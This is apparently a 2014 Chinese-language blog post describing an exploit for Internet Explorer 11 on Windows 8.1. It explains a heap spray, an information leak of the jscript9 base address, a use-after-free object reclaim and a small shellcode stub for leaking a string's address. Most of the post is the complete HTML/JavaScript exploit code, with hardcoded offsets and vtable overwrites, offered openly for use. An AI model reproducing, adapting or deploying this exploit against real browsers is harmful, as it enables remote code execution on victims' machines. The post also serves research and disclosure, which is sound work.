Title: Windows 8.1 + IE 11 Exploit
Date: 2014-02-28
Tags: Exploit


![Windows8.1_IE11_Exploit][Windows8.1_IE11_Exploit]


我的第一版只包含信息泄漏功能的代码只用了7行javascript。简单说一下这个方法比较有意思的地方吧，因为IntArray类型的数组在存储数据时高位不能为1。否则其会以double形式存储。这就导致我们在使用其存储shell code时需要编码(解决高位为1的问题)。而我比较喜欢用字符串来存储我的shell code，这样就可以将我以前的shell code不需要修改直接拿来使用了。

解决这个问题，我的思路主要是，先释放一个IntArray对象，然后使用一个ObjectArray类型的对象进行占位。这个ObjectArray对象内部保存着存储了shell code字符串的指针。这样就可以再进行一次信息泄漏来实现读取字符串的地址了。而因为IE 11内部存储字符串使用的是Js::LiteralString对象进行存储的。所以直接读取的其实是Js::LiteralString对象的地址而不是存储了shell code的BSTR的地址。解决这个问题我使用了一个技巧，详细可以看代码。简单的说就是，用一个很小的shell code来实现获取存储了shell code的BSTR的地址。再将其写入到IntArray中泄漏出来。很简单，但很有效。

因为我喜欢用最简单的方法来解决问题，所以我的代码极其短小、整洁。

代码具体如下：

```
<html>	<body>		<script>            function exp()            {                var array_1 = new Array();                var size = 0x1000 * 0x100;                for(var i=0; i<size; i+=1)                {                    array_1[i] = new Array(1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1);                }                for(var i=size-2;i>0;i--)                {                    array_1[i][22] = 0x7fffffff;                    array_1[i][29] = 0x7fffffff;                    array_1[i][30] = 0x7fffffff;                    if(array_1[i+1].length == 0x7fffffff)                    {                        var array_vft_address = array_1[i+1][18];                        var jscript9_base_addr = array_vft_address - 0x00004534;                        var shell_code = "\u9090\u9090";                        delete array_1[i + 3];                        CollectGarbage();                                                var new_obj = new Array(shell_code,shell_code,shell_code,shell_code,
                        shell_code,shell_code,shell_code,shell_code,
                        shell_code,shell_code,shell_code,shell_code,
                        shell_code,shell_code,shell_code,shell_code,
                        shell_code,shell_code,shell_code,shell_code,
                        shell_code,shell_code,shell_code,shell_code,
                        shell_code,shell_code,shell_code,shell_code);                                                array_1[i][0] = jscript9_base_addr + 0x00143BA1;                        array_1[i][1] = 0x0c0c0000;                        array_1[i][4] = 0x0c0c0000;                        array_1[i+1][18] = 0x0c0bffbc;                        0x0c0c003c in (array_1[i + 2]);                        array_1[i][0] = 0x0c0c003c;
                        //get bstr address                        //A1 90010C0C   mov eax,dword ptr ds:[0xC0C0190]                        //83C0 0C       add eax,0xC                        //8B18          mov ebx,dword ptr ds:[eax]                        //8BC3          mov eax,ebx                        //A3 B8000C0C   mov dword ptr ds:[0xC0C00B8],eax                        //C2 0400       retn 0x4
                        array_1[i][1] = 0x0c0190a1;                        array_1[i][2] = 0x0cc0830c;                        array_1[i][3] = 0x4646188b;                        array_1[i][4] = 0x4646c38b;                        array_1[i][5] = 0x0c00b8a3;                        array_1[i][6] = 0x0004c20c;                        0x0c0c003c in (array_1[i + 2]);                        var bstr_addr = array_1[i + 1][0];                        array_1[i][0] = jscript9_base_addr + 0x00143BA1;                        array_1[i][1] = 0x0c0c0000;                        array_1[i][4] = bstr_addr-2;                        array_1[i+1][18] = 0x0c0bffbc;                        (0x0c0c003c) in (array_1[i + 2]);                        alert("bstr protect edit");                        array_1[i][0] = bstr_addr;                        0x0c0c003c in (array_1[i + 2]);                        break;                    }                }            }		</script>	</body></html>
```

感谢：

* @tombkeeper
* @ga1ois
* @bluerust

在此还要感谢这篇文章的作者，《A browser is only as strong as its weakest byte Exodus Intelligence》:http://ifsec.blogspot.jp/2013/11/exploiting-internet-explorer-11-64-bit.html，没有你那么深刻的讲解，我自己也许不知道什么时候才能想的到这么巧妙的方法。所有的掌声都送给你。

[Windows8.1_IE11_Exploit]: /Windows8.1_and_IE11_Exploit/images/Windows_8.1_and_IE11_Exploit.gif